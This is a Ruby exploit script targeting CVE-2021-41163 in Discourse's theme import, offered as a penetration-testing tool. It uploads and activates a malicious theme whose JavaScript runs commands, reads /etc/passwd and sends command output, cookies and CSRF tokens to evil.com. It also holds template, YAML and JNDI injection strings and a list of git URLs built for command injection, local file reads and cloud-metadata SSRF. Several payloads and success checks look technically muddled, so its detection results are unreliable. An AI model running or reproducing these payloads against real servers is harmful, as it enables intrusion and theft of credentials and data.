#!/usr/bin/env ruby

=begin
CVE-2021-41163: Discourse Remote Code Execution via Theme Import
Severity: Critical
CVSS: 9.8

Description:
Remote code execution vulnerability in Discourse theme import functionality
allowing authenticated attackers to execute arbitrary code on the server.

Affected Versions:
- Discourse < 2.7.8
- Discourse < 2.8.0.beta6

Author: ibrahimsql
Date: 2025
Purpose: Educational and authorized penetration testing only

WARNING: Use only on systems you own or have explicit permission to test!
=end

require 'net/http'
require 'uri'
require 'json'
require 'time'
require 'optparse'
require 'openssl'
require 'nokogiri'
require 'zip'
require 'tempfile'
require 'base64'

class CVE_2021_41163
  def initialize(target_url, session_options = {})
    @target_url = target_url.chomp('/')
    @proxy = session_options[:proxy]
    @timeout = session_options[:timeout] || 10
    @csrf_token = nil
    @admin_session = false
    
    @headers = {
      'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      'Accept' => 'application/json, text/javascript, */*; q=0.01',
      'Accept-Language' => 'en-US,en;q=0.9'
    }
  end

  def get_csrf_token
    """
    Extracts CSRF token from the main page
    """
    begin
      response = make_request('GET', @target_url)
      
      if response && response[:status_code] == 200
        doc = Nokogiri::HTML(response[:body])
        csrf_meta = doc.at('meta[name="csrf-token"]')
        
        if csrf_meta
          @csrf_token = csrf_meta['content']
          return @csrf_token
        end
      end
    rescue => e
      puts "[!] Error getting CSRF token: #{e.message}"
    end
    
    nil
  end

  def check_admin_access
    """
    Checks if current session has admin access
    """
    begin
      response = make_request('GET', "#{@target_url}/admin")
      if response && response[:status_code] == 200 && response[:body].downcase.include?('admin')
        @admin_session = true
        return true
      end
    rescue
      # Ignore errors
    end
    
    false
  end

  def create_malicious_theme
    """
    Creates a malicious theme ZIP file for CVE-2021-41163
    """
    # Create malicious theme files
    theme_files = {
      'about.json' => JSON.generate({
        "name" => "Malicious Theme",
        "about_url" => "https://github.com/evil/theme",
        "license_url" => "https://github.com/evil/theme/blob/master/LICENSE",
        "assets" => {
          "evil.js" => "assets/evil.js"
        },
        "color_schemes" => {},
        "modifiers" => {}
      }),
      
      # Malicious JavaScript payload
      'assets/evil.js' => <<~JS,
        // CVE-2021-41163 RCE Payload
        console.log("CVE-2021-41163 RCE Test");
        
        // Attempt to execute system commands
        try {
            // Node.js command execution
            const { exec } = require('child_process');
            exec('id', (error, stdout, stderr) => {
                if (stdout) {
                    console.log('Command output:', stdout);
                    // Send output to external server
                    fetch('http://evil.com/log', {
                        method: 'POST',
                        body: JSON.stringify({cmd: 'id', output: stdout})
                    });
                }
            });
            
            // Try to read sensitive files
            const fs = require('fs');
            fs.readFile('/etc/passwd', 'utf8', (err, data) => {
                if (data) {
                    console.log('File content:', data);
                    fetch('http://evil.com/log', {
                        method: 'POST',
                        body: JSON.stringify({file: '/etc/passwd', content: data})
                    });
                }
            });
            
            // Environment variables
            console.log('Environment:', process.env);
            
        } catch (e) {
            console.log('Error:', e);
        }
        
        // Browser-side payload
        if (typeof window !== 'undefined') {
            // Steal admin cookies
            fetch('http://evil.com/cookies', {
                method: 'POST',
                body: document.cookie
            });
            
            // Steal CSRF token
            const csrfToken = document.querySelector('meta[name="csrf-token"]');
            if (csrfToken) {
                fetch('http://evil.com/csrf', {
                    method: 'POST',
                    body: csrfToken.content
                });
            }
        }
      JS
      
      # Malicious CSS with potential RCE
      'assets/evil.css' => <<~CSS,
        /* CVE-2021-41163 CSS Payload */
        body::before {
            content: "RCE Test";
            background: url('javascript:alert("XSS")');
        }
        
        /* Attempt CSS injection */
        @import url('data:text/css;base64,Ym9keSB7IGJhY2tncm91bmQ6IHVybCgnamF2YXNjcmlwdDphbGVydCgiQ1NTIEluamVjdGlvbiIpJyk7IH0=');
      CSS
      
      # Theme template with server-side injection
      'templates/header.hbs' => <<~HBS,
        {{!-- CVE-2021-41163 Template Injection --}}
        <script>
        // Server-side template injection attempt
        {{#if (lookup this "constructor")}}
            {{#with (lookup this "constructor")}}
                {{#with (lookup this "constructor")}}
                    {{lookup this "call" "call" "call" (lookup this "process") "mainModule" "require" "child_process" "exec" "id"}}
                {{/with}}
            {{/with}}
        {{/if}}
        
        // Client-side payload
        console.log("Template injection test");
        fetch('http://evil.com/template', {method: 'POST', body: 'Template executed'});
        </script>
        
        <div class="malicious-theme">
            <h1>Malicious Theme Loaded</h1>
            <p>CVE-2021-41163 RCE Test</p>
        </div>
      HBS
      
      # Settings with potential injection
      'settings.yml' => <<~YAML
        name: "Malicious Theme"
        description: "Theme with RCE payload"
        author: "Evil Hacker"
        version: "1.0.0"
        
        # Potential YAML injection
        malicious_setting: !!python/object/apply:os.system ["id"]
        command_injection: "`id`"
        eval_injection: "${jndi:ldap://evil.com/exploit}"
      YAML
    }
    
    # Create ZIP file in memory
    zip_data = Zip::OutputStream.write_buffer do |zip|
      theme_files.each do |filename, content|
        zip.put_next_entry(filename)
        zip.write(content)
      end
    end
    
    zip_data.string
  end

  def exploit_theme_import_rce
    """
    Exploits CVE-2021-41163: RCE via theme import
    """
    results = {
      cve: 'CVE-2021-41163',
      vulnerable: false,
      severity: 'Critical',
      cvss: 9.8,
      details: [],
      payloads: [],
      rce_evidence: []
    }
    
    get_csrf_token unless @csrf_token
    
    # Check admin access
    unless check_admin_access
      results[:details] << "Admin access required for theme import"
      return results
    end
    
    begin
      # Create malicious theme
      malicious_theme = create_malicious_theme
      
      # Upload malicious theme
      boundary = "----WebKitFormBoundary#{rand(1000000000)}"
      
      form_data = []
      form_data << "--#{boundary}"
      form_data << 'Content-Disposition: form-data; name="remote"'
      form_data << ''
      form_data << ''
      form_data << "--#{boundary}"
      form_data << 'Content-Disposition: form-data; name="branch"'
      form_data << ''
      form_data << 'master'
      form_data << "--#{boundary}"
      form_data << 'Content-Disposition: form-data; name="theme"; filename="malicious_theme.zip"'
      form_data << 'Content-Type: application/zip'
      form_data << ''
      form_data << malicious_theme
      form_data << "--#{boundary}--"
      
      body = form_data.join("\r\n")
      
      headers = {
        'Content-Type' => "multipart/form-data; boundary=#{boundary}",
        'X-CSRF-Token' => @csrf_token || '',
        'X-Requested-With' => 'XMLHttpRequest'
      }
      
      puts "[*] Uploading malicious theme..."
      response = make_request('POST', "#{@target_url}/admin/themes/import", nil, body, headers)
      
      if check_theme_upload_success(response)
        results[:vulnerable] = true
        results[:details] << "Malicious theme uploaded successfully"
        results[:payloads] << "malicious_theme.zip"
        
        # Try to activate the theme
        theme_id = extract_theme_id(response)
        if theme_id
          activation_result = activate_malicious_theme(theme_id)
          if activation_result
            results[:details] << "Malicious theme activated"
            results[:rce_evidence] << "Theme activation successful"
          end
        end
        
        # Check for RCE evidence
        rce_check = check_rce_execution
        if rce_check && !rce_check.empty?
          results[:rce_evidence].concat(rce_check)
        end
      end
      
    rescue => e
      results[:details] << "Error in theme import exploit: #{e.message}"
    end
    
    results
  end

  def exploit_theme_git_rce
    """
    Exploits CVE-2021-41163 via Git repository import
    """
    results = {
      cve: 'CVE-2021-41163',
      test: 'git_import_rce',
      vulnerable: false,
      details: [],
      payloads: []
    }
    
    # Malicious Git repository URLs
    malicious_repos = [
      # Git hooks exploitation
      'https://github.com/evil/malicious-theme.git',
      'git://evil.com/malicious-theme.git',
      
      # Git submodule exploitation
      'https://github.com/evil/theme-with-submodules.git',
      
      # Git LFS exploitation
      'https://github.com/evil/theme-with-lfs.git',
      
      # Local file inclusion via Git
      'file:///etc/passwd',
      'file:///proc/self/environ',
      
      # Command injection in Git URL
      'https://github.com/evil/theme.git; id',
      'https://github.com/evil/theme.git`id`',
      'https://github.com/evil/theme.git$(id)',
      
      # SSRF via Git
      'http://127.0.0.1:22/evil.git',
      'http://169.254.169.254/latest/meta-data/evil.git'
    ]
    
    malicious_repos.each do |repo_url|
      begin
        data = {
          'remote' => repo_url,
          'branch' => 'master'
        }
        
        headers = {
          'Content-Type' => 'application/x-www-form-urlencoded',
          'X-CSRF-Token' => @csrf_token || '',
          'X-Requested-With' => 'XMLHttpRequest'
        }
        
        response = make_request('POST', "#{@target_url}/admin/themes/import", data, nil, headers)
        
        if check_git_rce_success(response, repo_url)
          results[:vulnerable] = true
          results[:details] << "Git RCE via: #{repo_url}"
          results[:payloads] << repo_url
        end
        
        sleep(1)
        
      rescue => e
        results[:details] << "Error testing Git RCE: #{e.message}"
      end
    end
    
    results
  end

  def run_exploit
    """
    Runs the complete CVE-2021-41163 exploit
    """
    puts "[*] Exploiting CVE-2021-41163 against #{@target_url}"
    puts "[*] Severity: Critical (CVSS: 9.8)"
    puts "[*] Description: RCE via Discourse Theme Import"
    puts "-" * 60
    
    results = {
      cve: 'CVE-2021-41163',
      target: @target_url,
      severity: 'Critical',
      cvss: 9.8,
      vulnerable: false,
      tests: {},
      summary: {
        total_tests: 0,
        successful_tests: 0,
        rce_evidence: []
      }
    }
    
    # Test theme import RCE
    puts "[*] Testing theme import RCE..."
    theme_results = exploit_theme_import_rce
    results[:tests][:theme_import_rce] = theme_results
    results[:summary][:total_tests] += 1
    
    if theme_results[:vulnerable]
      results[:vulnerable] = true
      results[:summary][:successful_tests] += 1
      results[:summary][:rce_evidence].concat(theme_results[:rce_evidence])
      puts "[+] Theme import RCE successful!"
    else
      puts "[-] Theme import RCE failed"
    end
    
    # Test Git repository RCE
    puts "[*] Testing Git repository RCE..."
    git_results = exploit_theme_git_rce
    results[:tests][:git_import_rce] = git_results
    results[:summary][:total_tests] += 1
    
    if git_results[:vulnerable]
      results[:vulnerable] = true
      results[:summary][:successful_tests] += 1
      puts "[+] Git repository RCE successful!"
    else
      puts "[-] Git repository RCE failed"
    end
    
    # Print summary
    puts "\n" + "=" * 60
    puts "CVE-2021-41163 EXPLOIT SUMMARY"
    puts "=" * 60
    puts "Target: #{@target_url}"
    puts "Vulnerable: #{results[:vulnerable] ? 'YES' : 'NO'}"
    puts "Tests Run: #{results[:summary][:total_tests]}"
    puts "Successful: #{results[:summary][:successful_tests]}"
    
    if !results[:summary][:rce_evidence].empty?
      puts "\nRCE Evidence:"
      results[:summary][:rce_evidence].each do |evidence|
        puts "  - #{evidence}"
      end
    end
    
    # Save results
    File.write('CVE-2021-41163_results.json', JSON.pretty_generate(results))
    puts "\n[*] Results saved to CVE-2021-41163_results.json"
    
    results
  end

  private

  def make_request(method, url, params = nil, body = nil, extra_headers = {})
    uri = URI(url)
    
    if method.upcase == 'GET' && params
      uri.query = URI.encode_www_form(params)
    end
    
    http = if @proxy
      proxy_uri = URI(@proxy)
      Net::HTTP.new(uri.host, uri.port, proxy_uri.host, proxy_uri.port)
    else
      Net::HTTP.new(uri.host, uri.port)
    end
    
    http.use_ssl = uri.scheme == 'https'
    http.verify_mode = OpenSSL::SSL::VERIFY_NONE
    http.read_timeout = @timeout
    http.open_timeout = @timeout
    
    request = case method.upcase
    when 'GET'
      Net::HTTP::Get.new(uri)
    when 'POST'
      Net::HTTP::Post.new(uri)
    when 'PUT'
      Net::HTTP::Put.new(uri)
    else
      Net::HTTP::Get.new(uri)
    end
    
    # Set headers
    @headers.merge(extra_headers).each { |key, value| request[key] = value }
    
    # Set body
    if body
      request.body = body
    elsif params && method.upcase != 'GET'
      if params.is_a?(Hash)
        request.body = URI.encode_www_form(params)
        request['Content-Type'] = 'application/x-www-form-urlencoded' unless extra_headers['Content-Type']
      else
        request.body = params
      end
    end
    
    begin
      response = http.request(request)
      {
        status_code: response.code.to_i,
        headers: response.to_hash,
        body: response.body
      }
    rescue => e
      puts "[!] Request error: #{e.message}"
      nil
    end
  end

  def check_theme_upload_success(response)
    """
    Checks if theme upload was successful
    """
    return false unless response
    return false unless [200, 201].include?(response[:status_code])
    
    content = response[:body].downcase
    
    success_indicators = [
      'theme imported', 'theme created', 'theme uploaded',
      'import successful', 'theme installed',
      'malicious theme', 'evil.js', 'rce test'
    ]
    
    success_indicators.any? { |indicator| content.include?(indicator) }
  end

  def extract_theme_id(response)
    """
    Extracts theme ID from response
    """
    return nil unless response
    
    begin
      content_type = response[:headers]['content-type']&.first || ''
      if content_type.start_with?('application/json')
        data = JSON.parse(response[:body])
        if data['theme'] && data['theme']['id']
          return data['theme']['id'].to_s
        end
      end
      
      # Try to extract from HTML
      theme_id_match = response[:body].match(/theme[_-]id["']?:\s*["']?(\d+)/)
      return theme_id_match[1] if theme_id_match
    rescue
      # Ignore errors
    end
    
    nil
  end

  def activate_malicious_theme(theme_id)
    """
    Attempts to activate the malicious theme
    """
    begin
      data = { 'id' => theme_id }
      
      headers = {
        'Content-Type' => 'application/json',
        'X-CSRF-Token' => @csrf_token || ''
      }
      
      response = make_request('PUT', "#{@target_url}/admin/themes/#{theme_id}", nil, JSON.generate(data), headers)
      
      response && [200, 201].include?(response[:status_code])
    rescue
      false
    end
  end

  def check_rce_execution
    """
    Checks for evidence of RCE execution
    """
    evidence = []
    
    begin
      # Check if malicious JavaScript was executed
      response = make_request('GET', @target_url)
      return evidence unless response
      
      content = response[:body].downcase
      
      rce_indicators = [
        'cve-2021-41163 rce test',
        'malicious theme loaded',
        'command output:',
        'file content:',
        'environment:',
        'rce test'
      ]
      
      rce_indicators.each do |indicator|
        if content.include?(indicator)
          evidence << "RCE indicator found: #{indicator}"
        end
      end
    rescue
      # Ignore errors
    end
    
    evidence
  end

  def check_git_rce_success(response, repo_url)
    """
    Checks if Git-based RCE was successful
    """
    return false unless response
    
    content = response[:body].downcase
    
    # Error messages that might indicate successful exploitation
    git_rce_indicators = [
      'command not found', 'permission denied',
      'no such file or directory', 'connection refused',
      'git clone', 'repository cloned',
      'hook executed', 'submodule',
      'fatal:', 'error:', 'warning:'
    ]
    
    git_rce_indicators.each do |indicator|
      return true if content.include?(indicator)
    end
    
    # Check for specific command injection results
    if ['id', 'whoami', 'pwd'].any? { |cmd| repo_url.include?(cmd) }
      command_indicators = [
        'uid=', 'gid=', 'groups=',
        'root', 'www-data', 'discourse',
        '/home/', '/var/', '/usr/'
      ]
      
      command_indicators.each do |indicator|
        return true if content.include?(indicator)
      end
    end
    
    false
  end
end

def main
  options = {}
  OptionParser.new do |opts|
    opts.banner = "Usage: #{$0} [options] target_url"
    opts.separator ""
    opts.separator "CVE-2021-41163 Details:"
    opts.separator "  Severity: Critical (CVSS: 9.8)"
    opts.separator "  Description: RCE via Discourse theme import functionality"
    opts.separator "  Affected: Discourse < 2.7.8, < 2.8.0.beta6"
    opts.separator ""
    opts.separator "Example:"
    opts.separator "  ruby CVE-2021-41163.rb https://discourse.example.com"
    opts.separator ""
    opts.separator "WARNING: Use only on systems you own or have explicit permission to test!"
    opts.separator ""
    
    opts.on('--proxy PROXY', 'Proxy URL (e.g., http://127.0.0.1:8080)') do |proxy|
      options[:proxy] = proxy
    end
    
    opts.on('--timeout TIMEOUT', Integer, 'Request timeout (default: 10)') do |timeout|
      options[:timeout] = timeout
    end
    
    opts.on('-h', '--help', 'Show this help message') do
      puts opts
      exit
    end
  end.parse!
  
  if ARGV.empty?
    puts "Error: Target URL is required"
    puts "Usage: #{$0} [options] target_url"
    exit 1
  end
  
  target_url = ARGV[0]
  
  # Create and run exploit
  exploit = CVE_2021_41163.new(target_url, options)
  
  begin
    results = exploit.run_exploit
    
    if results[:vulnerable]
      puts "\n🚨 CRITICAL: Target is vulnerable to CVE-2021-41163!"
      puts "   Remote Code Execution possible via theme import!"
      puts "   Immediate patching required!"
    else
      puts "\n✅ Target appears to be patched against CVE-2021-41163"
    end
  rescue Interrupt
    puts "\n[!] Exploit interrupted by user"
  rescue => e
    puts "\n[!] Exploit failed: #{e.message}"
  end
end

if __FILE__ == $0
  main
end